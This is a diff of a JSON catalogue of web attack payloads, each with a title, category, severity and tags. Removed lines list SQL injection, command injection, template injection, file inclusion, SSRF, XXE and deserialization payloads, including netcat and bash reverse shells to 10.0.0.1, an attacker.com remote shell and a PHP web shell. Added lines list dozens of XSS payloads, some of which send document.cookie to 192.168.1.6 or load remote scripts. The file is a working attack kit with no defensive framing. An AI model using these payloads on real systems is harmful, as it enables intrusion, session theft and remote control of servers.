@@ -1,802 +1,770 @@
 [
   {
-    "title": "Basic Union Based SQLi",
-    "category": "SQL Injection",
-    "payload": "' UNION SELECT 1,2,3,4--",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "sqli, union, mysql"
-  },
-  {
-    "title": "Auth Bypass - Tautology",
-    "category": "SQL Injection",
-    "payload": "' OR '1'='1",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "sqli, auth-bypass, login"
-  },
-  {
-    "title": "Error Based SQLi (Version)",
-    "category": "SQL Injection",
-    "payload": "' AND EXTRACTVALUE(1, CONCAT(0x5c, @@version))--",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "sqli, error-based, mysql"
-  },
-  {
-    "title": "Time Based Blind SQLi (MySQL)",
-    "category": "SQL Injection",
-    "payload": "' AND SLEEP(5)--",
-    "type": "URL Parameter",
-    "severity": "Medium",
-    "tags": "sqli, blind, time-based"
-  },
-  {
-    "title": "Time Based Blind SQLi (Postgres)",
-    "category": "SQL Injection",
-    "payload": "'; SELECT pg_sleep(5);--",
-    "type": "URL Parameter",
-    "severity": "Medium",
-    "tags": "sqli, blind, postgres"
-  },
-  {
-    "title": "Boolean Blind SQLi",
-    "category": "SQL Injection",
-    "payload": "' AND 1=1--",
-    "type": "URL Parameter",
-    "severity": "Medium",
-    "tags": "sqli, blind, boolean"
-  },
-  {
-    "title": "SQLi Column Count Enumeration",
-    "category": "SQL Injection",
-    "payload": "' ORDER BY 10--",
-    "type": "URL Parameter",
-    "severity": "Low",
-    "tags": "sqli, recon"
-  },
-  {
-    "title": "SQLi Dump Users (MySQL)",
-    "category": "SQL Injection",
-    "payload": "' UNION SELECT 1,group_concat(user,0x3a,password),3 FROM mysql.user--",
-    "type": "URL Parameter",
-    "severity": "Critical",
-    "tags": "sqli, data-exfil"
-  },
-  {
-    "title": "SQLi Comment Truncation",
-    "category": "SQL Injection",
-    "payload": "admin'#",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "sqli, auth-bypass"
-  },
-  {
-    "title": "Inline Comment SQLi (WAF Bypass)",
-    "category": "SQL Injection",
-    "payload": "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "sqli, waf-bypass"
-  },
-  {
-    "title": "Basic Reflected XSS (Script)",
+    "title": "Basic Script Alert",
     "category": "XSS",
     "payload": "<script>alert(1)</script>",
     "type": "URL Parameter",
     "severity": "Medium",
-    "tags": "xss, reflected, basic"
+    "tags": "xss, basic"
   },
   {
-    "title": "XSS via SVG OnLoad",
+    "title": "Script Alert (Case Bypass)",
+    "category": "XSS",
+    "payload": "<Script>alert(1)</Script>",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, filter-bypass"
+  },
+  {
+    "title": "Script Domain Alert (Mixed Case)",
+    "category": "XSS",
+    "payload": "<sCript>alert(document.domain)</sCript>",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, filter-bypass, recon"
+  },
+  {
+    "title": "Script Alert 123",
+    "category": "XSS",
+    "payload": "<script>alert(123);</script>",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, basic"
+  },
+  {
+    "title": "Script Alert String",
+    "category": "XSS",
+    "payload": "<script>alert(\"test\");</script>",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, basic"
+  },
+  {
+    "title": "Script Cookie Alert",
+    "category": "XSS",
+    "payload": "<script>alert(document.cookie)</script>",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, cookie-theft"
+  },
+  {
+    "title": "Closing Tag Breakout",
+    "category": "XSS",
+    "payload": "</script><script>alert(document.cookie)</script>",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, breakout"
+  },
+  {
+    "title": "Javascript Protocol Cookie",
+    "category": "XSS",
+    "payload": "javascript:alert(document.cookie)",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, protocol"
+  },
+  {
+    "title": "Javascript Protocol Prompt",
+    "category": "XSS",
+    "payload": "javascript:prompt(document.cookie)",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, protocol"
+  },
+  {
+    "title": "JS Context Injection",
+    "category": "XSS",
+    "payload": "'-alert(document.cookie)-'",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, js-context"
+  },
+  {
+    "title": "Script Breakout to SVG",
+    "category": "XSS",
+    "payload": "</script><svg onload=alert(document.cookie)>",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, svg, breakout"
+  },
+  {
+    "title": "Attribute Injection OnMouseOver",
+    "category": "XSS",
+    "payload": "\"onmouseover=alert(document.cookie)//",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, attribute"
+  },
+  {
+    "title": "Vue/Angular Template Injection",
+    "category": "XSS",
+    "payload": "{{$on.constructor('alert(1)')()}}",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, template-injection"
+  },
+  {
+    "title": "Image OOB Exfiltration (New Image)",
+    "category": "XSS",
+    "payload": "<script>new Image().src=\"http://192.168.1.6/?c=\"+document.cookie;</script>",
+    "type": "Body Parameter",
+    "severity": "Critical",
+    "tags": "xss, oob, data-exfil"
+  },
+  {
+    "title": "Image OOB Exfiltration (Var)",
+    "category": "XSS",
+    "payload": "<script>var i=new Image; i.src=\"http://192.168.1.6/?\"+document.cookie;</script>",
+    "type": "Body Parameter",
+    "severity": "Critical",
+    "tags": "xss, oob, data-exfil"
+  },
+  {
+    "title": "Img OnError Basic",
+    "category": "XSS",
+    "payload": "<img src=\"abc\" onerror=\"alert(1)\">",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, image"
+  },
+  {
+    "title": "Img OnError Cookie",
+    "category": "XSS",
+    "payload": "<img src=\"\" onerror=\"alert(document.cookie)\">",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, image, cookie"
+  },
+  {
+    "title": "Img OnError Single Quotes",
+    "category": "XSS",
+    "payload": "<img src='x' onerror='alert(document.cookie)' />",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, image"
+  },
+  {
+    "title": "HTML Entity Encoded Img",
+    "category": "XSS",
+    "payload": "&lt;img src=0 onerror=alert(&#39;1&#39;)&gt;",
+    "type": "Body Parameter",
+    "severity": "Low",
+    "tags": "xss, encoded"
+  },
+  {
+    "title": "SVG OnLoad Compact",
     "category": "XSS",
     "payload": "<svg/onload=alert(1)>",
-    "type": "URL Parameter",
+    "type": "Body Parameter",
     "severity": "Medium",
-    "tags": "xss, svg, event-handler"
+    "tags": "xss, svg"
   },
   {
-    "title": "XSS via Image OnError",
+    "title": "Double Quote SVG Breakout",
     "category": "XSS",
-    "payload": "<img src=x onerror=alert(1)>",
+    "payload": "\"><svg onload=alert(1)>",
     "type": "URL Parameter",
     "severity": "Medium",
-    "tags": "xss, image, event-handler"
+    "tags": "xss, breakout, svg"
   },
   {
-    "title": "XSS via Body OnLoad",
+    "title": "JS Context Breakout (Single Quote)",
     "category": "XSS",
-    "payload": "<body onload=alert(1)>",
+    "payload": "';alert('1');'",
     "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, js-context"
+  },
+  {
+    "title": "Nested Script Tag (Filter Bypass)",
+    "category": "XSS",
+    "payload": "<sc<script>ript>alert(1)</sc</script>ript>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, filter-bypass, nested"
+  },
+  {
+    "title": "Body OnLoad Alert",
+    "category": "XSS",
+    "payload": "<BODY ONLOAD=alert('1')>",
+    "type": "Body Parameter",
     "severity": "Medium",
     "tags": "xss, body"
   },
   {
-    "title": "XSS Polyglot",
+    "title": "Marquee OnStart",
     "category": "XSS",
-    "payload": "javascript://%250Aalert(1)//\" /*\\*/ '; alert(1) /*",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "xss, polyglot"
+    "payload": "<marquee onstart=alert(1)></marquee>",
+    "type": "Body Parameter",
+    "severity": "Low",
+    "tags": "xss, obsolete"
   },
   {
-    "title": "DOM XSS Source",
+    "title": "Audio OnError",
     "category": "XSS",
-    "payload": "#<script>alert(1)</script>",
+    "payload": "<audio src/onerror=alert(1)>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, audio"
+  },
+  {
+    "title": "Remote Script Include",
+    "category": "XSS",
+    "payload": "<script src=\"http://192.168.1.6/test.js\" ></script>",
+    "type": "Body Parameter",
+    "severity": "Critical",
+    "tags": "xss, rfi"
+  },
+  {
+    "title": "Comment Breakout SVG",
+    "category": "XSS",
+    "payload": "--><svg/onload=alert(document.domain)>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, comment-breakout"
+  },
+  {
+    "title": "Comment Breakout Body",
+    "category": "XSS",
+    "payload": "--><body onload=alert(123) >",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, comment-breakout"
+  },
+  {
+    "title": "Comment Breakout Script",
+    "category": "XSS",
+    "payload": "--><script>alert(1)</script>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, comment-breakout"
+  },
+  {
+    "title": "Comment Breakout Img",
+    "category": "XSS",
+    "payload": "--><img src=x onerror=alert('test')>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, comment-breakout"
+  },
+  {
+    "title": "Iframe Source Injection",
+    "category": "XSS",
+    "payload": "<iframe src='https://testforiframe.site/'>",
+    "type": "Body Parameter",
+    "severity": "Low",
+    "tags": "xss, iframe, phishing"
+  },
+  {
+    "title": "Double Quote Iframe Breakout",
+    "category": "XSS",
+    "payload": "\"><iframe src='https://testforiframe.site/'>",
+    "type": "URL Parameter",
+    "severity": "Low",
+    "tags": "xss, iframe, breakout"
+  },
+  {
+    "title": "Double Quote Remote Script",
+    "category": "XSS",
+    "payload": "\"><script src=\"https://testforiframe.site/\"></script>",
+    "type": "URL Parameter",
+    "severity": "Critical",
+    "tags": "xss, rfi, breakout"
+  },
+  {
+    "title": "Double Quote Script Domain",
+    "category": "XSS",
+    "payload": "\"><script>alert(document.domain)</script>",
     "type": "URL Parameter",
     "severity": "Medium",
-    "tags": "xss, dom"
+    "tags": "xss, breakout"
   },
   {
-    "title": "XSS via Iframe",
+    "title": "Breakout with Newline",
     "category": "XSS",
-    "payload": "<iframe src=javascript:alert(1)></iframe>",
+    "payload": "\"><script>alert(document.domain + '\\n' + \"1\")</script>",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, breakout"
+  },
+  {
+    "title": "Quote Img OnError",
+    "category": "XSS",
+    "payload": "\"<img src='x' onerror='alert(10)' />\"",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, image"
+  },
+  {
+    "title": "Remote SVG Payload",
+    "category": "XSS",
+    "payload": "https://brutelogic.com.br/poc.svg",
+    "type": "URL Parameter",
+    "severity": "Low",
+    "tags": "xss, remote-file"
+  },
+  {
+    "title": "XSS Rocks Scriptlet",
+    "category": "XSS",
+    "payload": "http://xss.rocks/scriptlet.html",
+    "type": "URL Parameter",
+    "severity": "Low",
+    "tags": "xss, remote-file"
+  },
+  {
+    "title": "SVG Namespace Alert",
+    "category": "XSS",
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, svg"
+  },
+  {
+    "title": "SQLi Style Script Injection",
+    "category": "XSS",
+    "payload": "'or<script>alert(1)</script>",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, hybrid"
+  },
+  {
+    "title": "SQLi Style Image Injection",
+    "category": "XSS",
+    "payload": "'or<img src=0 onerror=alert('1')>",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, hybrid"
+  },
+  {
+    "title": "Malformed Script Tag",
+    "category": "XSS",
+    "payload": "<script <script>>alert('test')</script>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, filter-bypass"
+  },
+  {
+    "title": "Iframe JS Protocol",
+    "category": "XSS",
+    "payload": "<iframe src=javascript:alert('test')>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, iframe, protocol"
+  },
+  {
+    "title": "JS Context Comment",
+    "category": "XSS",
+    "payload": "';alert(test); //",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, js-context"
+  },
+  {
+    "title": "Body OnMouseOver Print",
+    "category": "XSS",
+    "payload": "<body onmouseover=\"print()\">",
+    "type": "Body Parameter",
+    "severity": "Low",
+    "tags": "xss, body, dos"
+  },
+  {
+    "title": "Body OnClick Print",
+    "category": "XSS",
+    "payload": "<body onclick=print()>",
+    "type": "Body Parameter",
+    "severity": "Low",
+    "tags": "xss, body"
+  },
+  {
+    "title": "Iframe OnLoad Print",
+    "category": "XSS",
+    "payload": "<iframe onload=print()></iframe>",
+    "type": "Body Parameter",
+    "severity": "Low",
+    "tags": "xss, iframe"
+  },
+  {
+    "title": "XSS Rocks JS Include",
+    "category": "XSS",
+    "payload": "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
+    "type": "Body Parameter",
+    "severity": "Critical",
+    "tags": "xss, rfi"
+  },
+  {
+    "title": "Image JS Protocol",
+    "category": "XSS",
+    "payload": "<IMG SRC=\"javascript:alert('XSS');\">",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, image, protocol"
+  },
+  {
+    "title": "Image JS Protocol (No Quotes)",
+    "category": "XSS",
+    "payload": "<IMG SRC=javascript:alert('XSS')>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, image, protocol"
+  },
+  {
+    "title": "Image JS Protocol (Mixed Case)",
+    "category": "XSS",
+    "payload": "<IMG SRC=JaVaScRiPt:alert('XSS')>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, image, filter-bypass"
+  },
+  {
+    "title": "Image Malformed Script",
+    "category": "XSS",
+    "payload": "<IMG \"\"\"><SCRIPT>alert(document.cookie)</SCRIPT>\"\\>",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, image, malformed"
+  },
+  {
+    "title": "Image FromCharCode",
+    "category": "XSS",
+    "payload": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, image, obfuscation"
+  },
+  {
+    "title": "Image OnError CharCode",
+    "category": "XSS",
+    "payload": "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, image, obfuscation"
+  },
+  {
+    "title": "Hex Encoded Image XSS",
+    "category": "XSS",
+    "payload": "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, image, encoded"
+  },
+  {
+    "title": "Commented Script Injection",
+    "category": "XSS",
+    "payload": "<<SCRIPT>alert(document.cookie);//\\<</SCRIPT>>",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, obfuscation"
+  },
+  {
+    "title": "Iframe Scriptlet Breakout",
+    "category": "XSS",
+    "payload": "<iframe src=http://xss.rocks/scriptlet.html <",
+    "type": "Body Parameter",
+    "severity": "Low",
+    "tags": "xss, iframe"
+  },
+  {
+    "title": "Title Tag Breakout",
+    "category": "XSS",
+    "payload": "</TITLE><SCRIPT>alert(document.cookie);</SCRIPT>",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, breakout"
+  },
+  {
+    "title": "Iframe JS Protocol Cookie",
+    "category": "XSS",
+    "payload": "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
     "type": "Body Parameter",
     "severity": "Medium",
     "tags": "xss, iframe"
   },
   {
-    "title": "XSS via Input Autofocus",
+    "title": "Iframe OnMouseOver Cookie",
     "category": "XSS",
-    "payload": "<input onfocus=alert(1) autofocus>",
+    "payload": "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>",
     "type": "Body Parameter",
-    "severity": "Medium",
-    "tags": "xss, html5"
+    "severity": "High",
+    "tags": "xss, iframe"
   },
   {
-    "title": "Blind XSS Payload",
+    "title": "Object Scriptlet",
     "category": "XSS",
-    "payload": "\"><script src=http://your-server.com/xss.js></script>",
+    "payload": "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>",
     "type": "Body Parameter",
-    "severity": "High",
-    "tags": "xss, blind, stored"
+    "severity": "Low",
+    "tags": "xss, object, rfi"
   },
   {
-    "title": "AngularJS Template Injection",
+    "title": "Script Arithmetic Injection",
     "category": "XSS",
-    "payload": "{{constructor.constructor('alert(1)')()}}",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "xss, angular, csti"
-  },
-  {
-    "title": "Basic Command Injection (Semi-colon)",
-    "category": "Command Injection",
-    "payload": "; id",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "rce, linux, basic"
-  },
-  {
-    "title": "Command Injection (Pipe)",
-    "category": "Command Injection",
-    "payload": "| id",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "rce, linux"
-  },
-  {
-    "title": "Command Injection (AND)",
-    "category": "Command Injection",
-    "payload": "&& id",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "rce, linux"
-  },
-  {
-    "title": "Command Injection (Backticks)",
-    "category": "Command Injection",
-    "payload": "`id`",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "rce, linux"
-  },
-  {
-    "title": "Command Injection (Subshell)",
-    "category": "Command Injection",
-    "payload": "$(id)",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "rce, linux"
-  },
-  {
-    "title": "Windows Command Injection (DIR)",
-    "category": "Command Injection",
-    "payload": "& dir",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "rce, windows"
-  },
-  {
-    "title": "Blind Command Injection (Ping)",
-    "category": "Command Injection",
-    "payload": "; ping -c 10 127.0.0.1",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "rce, blind"
-  },
-  {
-    "title": "Blind RCE via Sleep",
-    "category": "Command Injection",
-    "payload": "; sleep 10",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "rce, blind, time-based"
-  },
-  {
-    "title": "NC Reverse Shell",
-    "category": "Command Injection",
-    "payload": "; nc -e /bin/sh 10.0.0.1 4444",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "rce, reverse-shell"
-  },
-  {
-    "title": "Bash Reverse Shell",
-    "category": "Command Injection",
-    "payload": "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "rce, reverse-shell"
-  },
-  {
-    "title": "SSTI Jinja2 (Basic)",
-    "category": "SSTI",
-    "payload": "{{7*7}}",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "ssti, python, jinja2"
-  },
-  {
-    "title": "SSTI Jinja2 Config Dump",
-    "category": "SSTI",
-    "payload": "{{config.items()}}",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "ssti, python, jinja2"
-  },
-  {
-    "title": "SSTI Jinja2 RCE",
-    "category": "SSTI",
-    "payload": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "ssti, rce, python"
-  },
-  {
-    "title": "SSTI Twig (PHP)",
-    "category": "SSTI",
-    "payload": "{{7*7}}",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "ssti, php, twig"
-  },
-  {
-    "title": "SSTI Twig RCE",
-    "category": "SSTI",
-    "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "ssti, rce, php"
-  },
-  {
-    "title": "SSTI Freemarker (Java)",
-    "category": "SSTI",
-    "payload": "${7*7}",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "ssti, java, freemarker"
-  },
-  {
-    "title": "SSTI Freemarker RCE",
-    "category": "SSTI",
-    "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "ssti, rce, java"
-  },
-  {
-    "title": "SSTI Velocity (Java)",
-    "category": "SSTI",
-    "payload": "#set($x=7*7)$x",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "ssti, java, velocity"
-  },
-  {
-    "title": "SSTI Spring View Manipulation",
-    "category": "SSTI",
-    "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "ssti, rce, java, spring"
-  },
-  {
-    "title": "SSTI Golang (Go)",
-    "category": "SSTI",
-    "payload": "{{ . }}",
+    "payload": "<script>'-alert(1)-'</script>",
     "type": "URL Parameter",
     "severity": "Medium",
-    "tags": "ssti, go"
+    "tags": "xss, basic"
   },
   {
-    "title": "Basic LFI (Etc Passwd)",
-    "category": "LFI/RFI",
-    "payload": "../../../../../etc/passwd",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "lfi, linux"
-  },
-  {
-    "title": "LFI with Null Byte",
-    "category": "LFI/RFI",
-    "payload": "../../../../../etc/passwd%00",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "lfi, legacy-php"
-  },
-  {
-    "title": "Windows LFI (Boot.ini)",
-    "category": "LFI/RFI",
-    "payload": "..\\..\\..\\..\\boot.ini",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "lfi, windows"
-  },
-  {
-    "title": "LFI PHP Filter (Base64)",
-    "category": "LFI/RFI",
-    "payload": "php://filter/convert.base64-encode/resource=index.php",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "lfi, php, source-code"
-  },
-  {
-    "title": "RFI Remote Shell",
-    "category": "LFI/RFI",
-    "payload": "http://attacker.com/shell.php",
-    "type": "URL Parameter",
-    "severity": "Critical",
-    "tags": "rfi, rce"
-  },
-  {
-    "title": "LFI Log Poisoning (User Agent)",
-    "category": "LFI/RFI",
-    "payload": "<?php system($_GET['c']); ?>",
-    "type": "HTTP Header",
-    "severity": "Critical",
-    "tags": "lfi, rce, poisoning"
-  },
-  {
-    "title": "LFI via Data Wrapper",
-    "category": "LFI/RFI",
-    "payload": "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
-    "type": "URL Parameter",
-    "severity": "Critical",
-    "tags": "lfi, rce, wrapper"
-  },
-  {
-    "title": "LFI Path Truncation",
-    "category": "LFI/RFI",
-    "payload": "....//....//....//etc/passwd",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "lfi, filter-bypass"
-  },
-  {
-    "title": "LFI Expect Wrapper",
-    "category": "LFI/RFI",
-    "payload": "expect://id",
-    "type": "URL Parameter",
-    "severity": "Critical",
-    "tags": "lfi, rce, expect"
-  },
-  {
-    "title": "Proc Self Environ LFI",
-    "category": "LFI/RFI",
-    "payload": "../../../../../proc/self/environ",
-    "type": "URL Parameter",
-    "severity": "High",
-    "tags": "lfi, linux, proc"
-  },
-  {
-    "title": "SSRF Localhost Scan",
-    "category": "SSRF",
-    "payload": "http://127.0.0.1:8080",
-    "type": "Body Parameter",
-    "severity": "Medium",
-    "tags": "ssrf, internal-scan"
-  },
-  {
-    "title": "SSRF AWS Metadata",
-    "category": "SSRF",
-    "payload": "http://169.254.169.254/latest/meta-data/",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "ssrf, cloud, aws"
-  },
-  {
-    "title": "SSRF Google Cloud Metadata",
-    "category": "SSRF",
-    "payload": "http://metadata.google.internal/computeMetadata/v1/",
-    "type": "HTTP Header",
-    "severity": "Critical",
-    "tags": "ssrf, cloud, gcp"
-  },
-  {
-    "title": "SSRF Azure Metadata",
-    "category": "SSRF",
-    "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-    "type": "HTTP Header",
-    "severity": "Critical",
-    "tags": "ssrf, cloud, azure"
-  },
-  {
-    "title": "SSRF File Protocol",
-    "category": "SSRF",
-    "payload": "file:///etc/passwd",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "ssrf, lfi"
-  },
-  {
-    "title": "SSRF Dict Protocol",
-    "category": "SSRF",
-    "payload": "dict://127.0.0.1:6379/info",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "ssrf, redis"
-  },
-  {
-    "title": "SSRF Gopher Protocol",
-    "category": "SSRF",
-    "payload": "gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM%3A%3Chacker%40site.com%3E%0ARCPT%20TO%3A%3Cvictim%40site.com%3E%0ADATA%0AFrom%3A%20[Hacker]%0ASubject%3A%20SSRF%0A%0ASSRF%20via%20Gopher%0A.%0AQUIT",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "ssrf, smtp, gopher"
-  },
-  {
-    "title": "SSRF Localhost Decimal Bypass",
-    "category": "SSRF",
-    "payload": "http://2130706433",
-    "type": "Body Parameter",
-    "severity": "Medium",
-    "tags": "ssrf, bypass"
-  },
-  {
-    "title": "SSRF Localhost Octal Bypass",
-    "category": "SSRF",
-    "payload": "http://0177.0.0.1",
-    "type": "Body Parameter",
-    "severity": "Medium",
-    "tags": "ssrf, bypass"
-  },
-  {
-    "title": "SSRF Enclosed Alphanumeric Bypass",
-    "category": "SSRF",
-    "payload": "http://①②⑦.⓪.⓪.①",
-    "type": "Body Parameter",
-    "severity": "Medium",
-    "tags": "ssrf, bypass, unicode"
-  },
-  {
-    "title": "Basic XXE (Etc Passwd)",
-    "category": "XXE",
-    "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "xxe, lfi"
-  },
-  {
-    "title": "XXE Billions Laughs (DoS)",
-    "category": "XXE",
-    "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">...]>",
-    "type": "Body Parameter",
-    "severity": "Medium",
-    "tags": "xxe, dos"
-  },
-  {
-    "title": "Blind XXE (OOB)",
-    "category": "XXE",
-    "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]>",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "xxe, blind, oob"
-  },
-  {
-    "title": "XXE SSRF",
-    "category": "XXE",
-    "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&test;</root>",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "xxe, ssrf, cloud"
-  },
-  {
-    "title": "XXE PHP Expect",
-    "category": "XXE",
-    "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"expect://id\">]><root>&test;</root>",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "xxe, rce"
-  },
-  {
-    "title": "XXE XInclude",
-    "category": "XXE",
-    "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "xxe, xinclude"
-  },
-  {
-    "title": "XXE SOAP Injection",
-    "category": "XXE",
-    "payload": "<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Body><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root></soap:Body></soap:Envelope>",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "xxe, soap"
-  },
-  {
-    "title": "XXE JSON Content-Type Spoofing",
-    "category": "XXE",
-    "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "xxe, bypass"
-  },
-  {
-    "title": "XXE Local File Read (Windows)",
-    "category": "XXE",
-    "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///C:/Windows/win.ini\">]><root>&test;</root>",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "xxe, windows"
-  },
-  {
-    "title": "XXE UTF-7 Encoding",
-    "category": "XXE",
-    "payload": "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADw-!DOCTYPE root [+ADw-!ENTITY test SYSTEM \"file:///etc/passwd\"+AD4-]+AD4APA-root+AD4AJg-test+ADsAPA-/root+AD4-",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "xxe, encoding-bypass"
-  },
-  {
-    "title": "PHP Object Injection",
-    "category": "Deserialization",
-    "payload": "O:8:\"Exploit\":1:{s:7:\"command\";s:2:\"id\";}",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "deserialization, php"
-  },
-  {
-    "title": "Python Pickle RCE",
-    "category": "Deserialization",
-    "payload": "cos\nsystem\n(S'id'\ntR.",
-    "type": "Body Parameter",
-    "severity": "Critical",
